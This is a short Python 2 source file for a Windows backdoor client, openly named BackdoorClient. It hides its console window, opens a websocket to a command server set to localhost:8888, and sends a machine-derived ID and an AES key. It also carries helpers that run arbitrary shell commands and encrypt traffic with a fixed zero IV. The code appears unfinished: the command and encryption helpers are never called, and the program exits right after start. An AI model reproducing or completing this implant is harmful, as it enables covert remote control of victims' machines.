#!/usr/bin/env python
# coding:utf-8
import os
import ctypes
import threading
import chardet
import uuid
import json
from base64 import b64decode
from base64 import b64encode
from websocket import create_connection
from Crypto.Cipher import AES
__author__ = 'nekocode'


class BackdoorClient(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.SERVER_HOST = 'http://127.0.0.1:8888'
        self.ID = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))
        self.IV = '\0' * AES.block_size
        self.SECRET = os.urandom(32)

        self.daemon = True
        self.start()

    def run(self):
        ws = create_connection("ws://localhost:8888/")

        sercret_msg = {'id': self.ID, 'secret': b64encode(self.SECRET)}
        ws.send(json.dumps(sercret_msg))

        while True:
            result = ws.recv()
            print result

        ws.close()

    def encrypt(self, text):
        encryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        ciphertext = encryptor.encrypt(text)
        return b64encode(ciphertext)

    def decrypt(self, ciphertext):
        decryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        plain = decryptor.decrypt(b64decode(ciphertext))
        return plain


def dialog(content, title=u''):
        ctypes.windll.user32.MessageBoxW(None, content, title, 0)


def cmd(cl):
        rlt = os.popen(cl)
        content = ''.join(rlt.readlines())
        return content.decode(chardet.detect(content)['encoding'])


def hide_cmd_window():
    whnd = ctypes.windll.kernel32.GetConsoleWindow()
    if whnd != 0:
        ctypes.windll.user32.ShowWindow(whnd, 0)
        ctypes.windll.kernel32.CloseHandle(whnd)

if __name__ == '__main__':
    hide_cmd_window()
    BackdoorClient()


